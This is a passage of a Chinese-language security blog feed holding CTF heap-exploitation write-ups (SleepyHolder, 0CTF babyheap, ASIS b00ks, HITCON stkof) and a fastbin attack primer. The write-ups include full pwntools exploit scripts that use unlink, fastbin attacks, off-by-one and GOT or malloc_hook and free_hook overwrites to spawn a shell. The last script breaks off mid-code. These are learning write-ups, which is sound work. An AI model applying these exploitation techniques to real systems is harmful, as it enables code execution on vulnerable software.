依次分配small和big两个secret，然后释放掉small secret，small secret将进入fast bin。 此时再申请large secret。由于这是一个large chunk，会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin，不能合并的就直接放到unsortedbin，这样的目的是减少堆中的碎片。所以small secret将会进入unsorted bin，于此同时，big secret的inuse位也将会被置0。 再次释放small secret。因为之前释放的small secret已经不在fast bin中，所以此时不会被检测到double free。 申请small secret。从fast bin中取回small secret。这样就达到了修改inuse位的目的 unlink 前提知识：由于堆块的复用机制，当前一个chunk还在被使用时，后一个chunk的prevsize是归属于前一chunk，作为前一个chunk的数据区域。 程序中，small secret的大小为0x28，刚好可以利用到下一个chunk的prevsize。如下：12345670x6032e0: 0x0000000000000000 0x0000000000000031 &lt;== small secret0x6032f0: 0x6161616161616161 0x61616161616161610x603300: 0x6161616161616161 0x61616161616161610x603310: **0x0a61616161616161** 0x0000000000000fb1 &lt;== big secret0x603320: 0x6262626262626262 0x62626262626262620x603330: 0x6262626262626262 0x62626262626262620x603340: 0x6262626262626262 0x000000000000000a 所以可以通过double free来改变big secret的inuse位，又可以控制big secret的prevsize，且堆指针是全局变量，可以成功实现unlink。 漏洞利用 按照前文方法修改inuse位 在small secret构造一个fake chunk，并修改big chunk的prevsize 释放big secret，触发unlink 通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址 算出system的地址，并将其写入free_got 调用free，成功getshell 我的exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./SleepyHolder')elf = ELF('./SleepyHolder')libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')def add(index, content): p.recvuntil('3. Renew secret\n') p.sendline('1') p.recvuntil('\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content) def delete(index): p.recvuntil('3. Renew secret\n') p.sendline('2') p.recvuntil('2. Big secret\n') p.send(str(index))def update(index, content): p.recvuntil('3. Renew secret\n') p.sendline('3') p.recvuntil('2. Big secret\n') p.sendline(str(index)) p.recvuntil('secret: \n') p.send(content)#分配chunk1 chunk2add(1, 'a'*0x10)add(2, 'b'*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, 'c'*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got['free']atoi_got = elf.got['atoi']puts_got = elf.got['puts']puts = elf.symbols['puts']system_off = libc.symbols['system']atoi_off = libc.symbols['atoi']#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + '\x00\x00') - atoi_off#通过调试发现，这里只能取6个字节print "libc_base : %#x" % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, '/bin/sh\x00')delete(2)p.interactive() 相关链接题目链接：SleepyHolderexp参考：how2heap提供]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>double_free</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之fastbin attack]]></title>
    <url>%2Fpost%2F531412d5.html</url>
    <content type="text"><![CDATA[原理fastbin attack是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。主要利用了fast bin的单链表管理机制。 相关源码：malloc：123456789101112131415161718/* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) &#123; // 得到对应的fastbin的下标 idx = fastbin_index(nb); // 得到对应的fastbin的头指针 mfastbinptr *fb = &amp;fastbin(av, idx); mchunkptr pp = *fb; // 利用fd遍历对应的bin内是否有空闲的chunk块， do &#123; victim = pp; if (victim == NULL) break; &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim); ... 这里首先根据所需chunk的大小获得该chunk所属fast bin的index，根据该index获得所需fast bin的空闲chunk链表指针，然后将头指针的下一个chunk（victim-&gt;fd）作为空闲chunk链表的头部（取出头部的chunk）。这里catomic_compare_and_exchange_val_acq是使用了lock-free的技术实现单向链表删除第一个node的操作，暂时不必关注。可以注意到，这里是通过fd指针来获取下一个chunk的。所以如果可以控制某个fast bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在任意地方分配chunk的目的。 但是这里需要绕过一个检查:12345678910111213// 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; ...&#125; malloc会检查取到的chunk的size是否是符合这个fast bin的，若是不符合则会GG。所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。巧妙的是，因为此处没有对内存进行对齐检查，所以可以通过错位的方式来构造出一个假的size出来（详见文末相关题目） 利用前提 存在堆溢出、UAF等可以控制堆块内容（fd指针）的漏洞 漏洞发生于fast chunk 可以在目标位置构造出合适的size来绕过检查 利用过程 在想要分配的目标内存附近找到或者利用错位构造一个合适的size，用于绕过检查 释放掉victim（fast chunk） 通过从上一个chunk溢出或UAf等方式修改victim的fd指针，使fd指针指向构造好size的目标chunk 通过两次分配，得到目标chunk 题目 0CTF 2017 babyheap]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf2017-babyheap writeup]]></title>
    <url>%2Fpost%2F47331c36.html</url>
    <content type="text"><![CDATA[题目描述题目来源：0CTF 2017知识点：fastbin attack，chunk overlap题目是一个内存管理系统，能增删查改。 1234567===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 题目是64位程序，开启保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 程序概况Allocate函数：12345678910111213141516171819202122232425262728void __fastcall Allocate(__int64 a1)&#123; signed int i; // [rsp+10h] [rbp-10h] signed int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(_DWORD *)(24LL * i + a1) ) &#123; printf("Size: "); v2 = get_num(); if ( v2 &gt; 0 ) &#123; if ( v2 &gt; 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf("Allocate Index %d\n", (unsigned int)i); &#125; return; &#125; &#125;&#125; 限制chunk最大为4096，使用calloc意味着分配时会将chunk中的内容清0。最后将数据存入结构体1234500000000 chunk struc ; (sizeof=0x18, mappedto_6)00000000 inuse dq ?00000008 length dq ?00000010 ptr dq ?00000018 chunk ends Fill函数：1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf("Index: "); result = get_num(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf("Size: "); result = get_num(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf("Content: "); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125; 发现此处没有对size进行限制，存在溢出。并且，sub_11B2这个读取字符串的函数没有在字符串末尾加上&#39;\x00&#39; Free函数中将堆块释放，并将指针清0，没有什么问题。 dump函数将指定索引的堆块内容输出 漏洞分析泄露libc基址（chunk overlap）因为在small bin中只有一个chunk时，这个chunk的fd和bk将指向libc中某个地址（&amp;main_arena+88）,所以只要能够输出fd或者bk，就能泄露出libc的基址。123456780x555555757000 PREV_INUSE &#123; prev_size = 0, size = 209, fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, &lt;== libc中的地址 bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 问题的关键转移到如何输出fd和bk。因为存在堆溢出，那么可以通过从chunk0溢出到chunk1，修改chunk1的size，使size变大从而造成overlap，让chunk2的头部包含在chunk1中，然后就可以通过打印chunk1来泄露libc了 fastbin attack先将chunk1释放，通过从chunk0溢出到chunk1的fd，通过控制chunk1的fd，则可以在几乎任意地方分配chunk。因为程序开启PIE和RELRO，所以没办法利用got表，则考虑malloc_hook或者free_hook等。这里需要考虑一个问题，在从fast bin分配chunk时，会检查取到的chunk大小是否与相应的fastbin索引一致（源码如下），也就是说若要在某个地方分配chunk，需要先在这个地方构造好size，使这个size恰好属于chunk所在的fastbin。1234567891011 // 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; 巧妙的是，在malloc_hook的前面，有类似这样的数据:1230x7ffff7dd3720 &lt;__memalign_hook&gt;: 0x00007ffff7a94fc0 0x00000000000000000x7ffff7dd3730 &lt;__realloc_hook&gt;: 0x00007ffff7a94f60 0x00000000000000000x7ffff7dd3740 &lt;__malloc_hook&gt;: 0x00007ffff7a94f20 0x0000000000000000 又因为这里并没有对齐检测，所以可以通过利用没有对齐的数据来通过检测。通过截取上面数据的7f，和后面的00拼在一起，变成:1230x7ffff7dd371d: 0xfff7a94fc0000000 0x000000000000007f0x7ffff7dd372d: 0xfff7a94f60000000 0x000000000000007f0x7ffff7dd373d: 0xfff7a94f20000000 0x000000000000007f 这样就构造出了一个size为0x7f的chunk。这样就可以在这分配一个大小为0x7f的chunk，然后从这写入，覆盖一定的无效数据就能到达malloc_hook的地址，然后向malloc_hook中写入one_gadget就可以getshell了。（了解one_gadget） 漏洞利用 分配两个chunk,大小分别为0x60和0x40（第二个chunk较小是为了之后能够改大，而又不超过fastbin限制） 从chunk0溢出到chunk1的size，将其改成0x70，使chunk1覆盖的范围变大。但此时还并没有真正变大，要释放后重新分配出来才能生效。 再分配两个chunk，chunk2需要是small chunk，chunk3是用来隔开top chunk，防止释放chunk2时被top chunk合并。因为在free的时候会检查下一个chunk的size是否大于2*size_sz并且小于system_mem（源码如下），所以还要在chunk2中构造一个fake size 12345678910// 下一个chunk的大小nextsize = chunksize(nextchunk);// next chunk size valid check// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者// nextsize是否大于系统可提供的内存if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout;&#125; 将chunk1释放，并重新分配一个大小0x60的chunk，这里chunk1被取回并成功扩大。 因为使用的calloc会初始化内存，所以还需要恢复一下chunk2的前20个字节 释放chunk2，chunk2进入small bin 打印chunk1，泄露出libc的基址 通过libc基址计算出malloc_hook的地址和one_gadget的地址 释放掉chunk1，通过溢出chunk0来修改chunk1的fd，将fd修改到malloc_hook附近 通过两次分配，得到malloc_hook附近的chunk 向malloc_hook中写入one_gadget，成功getshell exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding:utf-8 -*-from pwn import *p = process('./0ctfbabyheap')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Allocate(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def Fill(index, content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content) + 1)) p.recvuntil('Content: ') p.sendline(content)def Free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def Dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: \n') data = p.recvline() return datadef leak_libc(): Allocate(0x60) #0 Allocate(0x40) #1 #从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大 payload = 'a'*0x60 + p64(0) + p64(0x71) Fill(0, payload) #分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并 #该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区 #接下来要将chunk1释放掉再分配使chunk1范围真正扩大 #但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem #所以还得构造一下next size Allocate(0x100) #2 Allocate(0x60) #3 payload = 'a'*0x10 + p64(0) + p64(0x71) Fill(2, payload) #释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空 #恢复smallchunk的前0x20个字节 Free(1) Allocate(0x60) #1 payload = 'a'*0x40 + p64(0) + p64(0x111) Fill(1, payload) #释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时 #该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中 #所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base Free(2) leaked = u64(Dump(1)[-9:-1]) - 0x3C27B8 print "libc_base : %#x" % (leaked) return leakeddef fastbin_attack(libc_base): #malloc_hook 可以在gdb中 x/32gx (long long)(&amp;main_arena)-0x40 来找到 malloc_hook = libc_base + libc.symbols['__malloc_hook'] #使用 one_gadget 找到execve('/bin/sh') execve_addr = libc_base + 0x4647c print "malloc_hook : %#x" % malloc_hook print "execve_addr : %#x" % execve_addr #释放掉chunk1 通过溢出chunk0来修改chunk1的fd #通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook #因为malloc会检查fastbin中chunk的size是否属于这个fastbin #而malloc_hook处的值为0 不能通过检查 #通过前文提到的未对齐的数据来绕过检查 #这样就可以获得一个size位为0x7f的chunk Free(1) payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0) Fill(0, payload) #通过两次分配 得到malloc_hook附近的chunk Allocate(0x60) Allocate(0x60) #覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr payload = p8(0)*3 + p64(execve_addr) Fill(2, payload) #malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell Allocate(0x60)libc_base = leak_libc()fastbin_attack(libc_base)p.interactive() 相关链接题目链接：0ctf_babyheapwriteup参考：Anciety师傅的博客]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>ctfwiki</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Asis2016-b00ks writeup]]></title>
    <url>%2Fpost%2Fb6745c59.html</url>
    <content type="text"><![CDATA[题目描述题目来源：Asis CTF 2016知识点：null byte off_by_one、mmap泄露libc基址题目是一个书籍管理系统，具有增删查改功能。 1234567891011nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks Welcome to ASISCTF book libraryEnter author name: aaaa1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt; 题目是64位程序，开启保护情况：123456[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序开启了PIE，意味着难以得到程序中函数的地址，可能对泄露libc造成阻碍。 程序概况程序首先要求输入author name，调用一个处理输入的函数（input函数）123456789101112131415161718192021signed __int64 __fastcall input(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\n' ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125; 分析代码可以发现，代码对字符串末尾处理不当，会在字符串的最后加上&#39;\x00&#39;,即使字符串已经占满buf。也就是说程序中存在null byte off_by_one漏洞 create函数:输入name，对大小没有限制1234567printf("\nEnter book name size: ", *&amp;v1); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 ) &#123; printf("Enter book name (Max 32 chars): ", &amp;v1); ptr = malloc(v1); ... 输入description，同样对大小无限制12345678910111213printf("\nEnter book description size: ", *&amp;v1);__isoc99_scanf("%d", &amp;v1);if ( v1 &gt;= 0 )&#123; v5 = malloc(v1); if ( v5 ) &#123; printf("Enter book description: ", &amp;v1); if ( input(v5, v1 - 1) ) &#123; printf("Unable to read description"); &#125; ... 最后将name和description的指针存入结构体12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *(v3 + 6) = v1; *(off_202010 + v2) = v3; *(v3 + 2) = v5; *(v3 + 1) = ptr; *v3 = ++cnt; return 0LL;&#125; 分析可得到结构体12345600000000 book struc ; (sizeof=0x20, mappedto_6)00000000 index dq ?00000008 name dq ?00000010 description dq ?00000018 size dq ?00000020 book ends delete函数会将指针清零，不存在悬挂指针edit函数用于编辑book的descriptionprint函数输出ID、name、description、author，可以用来泄露信息change_name函数可以修改author name 漏洞分析任意读写由于null byte off_by_one，在程序开头时，若输入32位的author name（unk_202040），那么&#39;\x00&#39;会溢出到book_list（unk_202060）中1234.data:0000000000202010 book_list dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38↑o.data:0000000000202010 ; delete:loc_C1B↑o ....data:0000000000202018 author_name dq offset unk_202040 ; DATA XREF: change_name+15↑o.data:0000000000202018 ; print+CA↑o 若是此时create一个book，那么新book的指针将会覆盖掉这个溢出的&#39;\x00&#39;，导致author name与book指针之间没有截断，意味着我可以通过输出author name来泄露出book的指针，也就是堆地址。1230x555555756040: 0x6161616161616161 0x6161616161616161 &lt;== author name0x555555756050: 0x6161616161616161 0x00616161616161610x555555756060: 0x0000555555757160 &lt;== book指针 由于程序提供修改author name的函数，所以可以再次输入32位的author name，使溢出的&#39;\x00&#39;覆盖掉book指针的最低字节，导致book的指针所指向的地址变小。10x0000555555757160 ==&gt; 0x0000555555757100 //地址变小 因为在create一个book时，会先申请name和description的空间，所以经过修改的book指针有可能就会指向地址偏小description的空间中1234567891011120x555555757000: 0x0000000000000000 0x0000000000000021 &lt;== name0x555555757010: 0x6161616161616161 0x00000000000000000x555555757020: 0x0000000000000000 0x0000000000000131 &lt;== description0x555555757030: 0x6262626262626262 0x00000000000000000x555555757040: 0x0000000000000000 0x0000000000000000 ......0x555555757100: 0x0000000000000000 0x0000000000000000 &lt;== 修改后的book指针，指向description中 ...... 0x555555757150: 0x0000000000000000 0x00000000000000310x555555757160: 0x0000000000000001 0x0000555555757010 &lt;== 修改前的book指针0x555555757170: 0x0000555555757030 0x00000000000001200x555555757180: 0x0000000000000000 0x0000000000020e81 所以可以事先在description中伪造一个book结构体，当book指针被修改于此时，就可以对伪造的name和description进行读写，实现任意读写。 泄露libc基址这道题由于开启PIE，并且没有uaf等常规方法来泄露libc，所以这里采用了一种更为巧妙的方法。在分配第二个book时，申请一个很大的空间，使堆以mmap模式进行拓展（可以参考这里）。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址123456789101112131415161718192021pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56052bb62000 0x56052bb64000 r-xp 2000 0 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd63000 0x56052bd64000 r--p 1000 1000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd64000 0x56052bd65000 rw-p 1000 2000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052d944000 0x56052d965000 rw-p 21000 0 [heap] 0x7fd6affa0000 0x7fd6b015e000 r-xp 1be000 0 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b015e000 0x7fd6b035e000 ---p 200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b035e000 0x7fd6b0362000 r--p 4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0362000 0x7fd6b0364000 rw-p 2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0364000 0x7fd6b0369000 rw-p 5000 0 0x7fd6b0369000 0x7fd6b038c000 r-xp 23000 0 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b054d000 0x7fd6b0572000 rw-p 25000 0 &lt;==== mmap分配的空间 0x7fd6b058a000 0x7fd6b058b000 rw-p 1000 0 0x7fd6b058b000 0x7fd6b058c000 r--p 1000 22000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058c000 0x7fd6b058d000 rw-p 1000 23000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058d000 0x7fd6b058e000 rw-p 1000 0 0x7ffe6b361000 0x7ffe6b382000 rw-p 21000 0 [stack] 0x7ffe6b3bd000 0x7ffe6b3bf000 r--p 2000 0 [vvar] 0x7ffe6b3bf000 0x7ffe6b3c1000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] getshell因为PIE，所以很难采用覆写got表等方法。而已经泄露了libc，所以这里采用向__free_hook写入system来getshell 漏洞利用 输入32位的author name，create一个book1（name：0x20字节，description：0x120字节） 调用show函数 泄露堆地址 create book2（description为大空间：0x21000字节），准备泄露libc基址 create book3（name写入&#39;/bin/sh\x00&#39;）为getshell做准备 在book1-&gt;description中伪造book结构体，name指针为book2的description指针（即mmap分配空间的地址），description指针为book3中description指针的地址。（这里地址都可以由泄露的堆地址加上偏移得到） 重新向author name中写入32个字节，使&#39;\x00&#39;覆盖掉book1指针的最低位字节，book1指针指向book1-&gt;description中布置好的book结构体 调用show函数，通过book1的name的值得到mmap分配的地址，减去固定的偏移获得libc基址 通过libc基址，计算出system和__free_hook的地址 调用edit，修改book1的description，写入free_hook的地址，因为第（5）步，所以这里实际是将book3的description指针改为free_hook的地址 调用edit，修改book3的description，写入system，因为第（9）步，所以这里实际是把system写入__free_hook中 调用delete(book3)，因为事先在name写入的&#39;/bin/sh\x00&#39;，所以成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#-*- coding=utf-8 -*-from pwn import *context.log_level = 'debug'p = process('b00ks')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(name, description): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Enter book name size: ') p.sendline(str(len(name))) p.recvuntil('Enter book name (Max 32 chars): ') p.send(name) p.recvuntil('Enter book description size: ') p.sendline(str(len(description))) p.recvuntil('Enter book description: ') p.send(description)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('id you want to delete: ') p.sendline(str(index))def edit(index, description): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('id you want to edit: ') p.sendline(str(index)) p.recvuntil('new book description: ') p.sendline(description)def show(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('Enter author name: ') p.sendline(name)def leak(addr1, addr2): payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120) edit(1, payload) change_name('a'*32) show() p.recvuntil('Name: ') res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) return res#泄露堆地址p.recvuntil('Enter author name: ')p.sendline('a'*32)create('a'*0x20, 'b'*0x120)show()p.recvuntil('Author: ')heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))print "heap_addr: %#x" % heap_addr#申请一个大内存，让堆以mmap模式进行拓展，进而泄露libc_basecreate('a'*0x20, '\x00'*0x21000)create('/bin/sh\x00', 'b'*0x8)#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #该值需要根据系统修改print "libc_base: %#x" % libc_base#计算地址system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']print "system: %#x" % systemprint "free_hook: %#x" % free_hook#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book-&gt;size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0edit(1, p64(free_hook)+'\x08')#向free_hook中写入systemedit(3, p64(system))#事先已经在chunk3的name中放入了/bin/sh\x00delete(3)p.interactive() 相关链接题目链接：b00ks]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>off_by_one</tag>
        <tag>ctfwiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2014-stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2014知识点：unlink这道题没有菜单显示，只能通过分析代码来了解程序功能。 功能： 添加（输入：长度） 修改（输入：索引、长度、内容） 删除（输入：索引） 程序保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序分析add函数中，对分配chunk的大小没有限制，将指针存到全局数组中，可获得指针变量的地址 set函数中，12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125; 对写入的长度没有限制，存在堆溢出，所以可以利用unlink漏洞 delete函数中，释放掉堆块并把指针清零0 由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数） 漏洞利用 分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并） 在chunk1中构造fake chunk，准备unlinkprevsize：0size：0x80fd：chunk_ptr - 0x18bk：chunk_ptr - 0x10注意：chunk_ptr是指向chunk0的指针变量所在的地址，而非指针指向的地址 从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）prevsize: 0x80size：0x90 释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18 把free的got表修改为puts。payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts)) 使用DynELF泄露system（详见代码） 利用（5）的方法，再将free的got表修改为system 向chunk3中写入/bin/sh\x00，释放chunk3，getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) 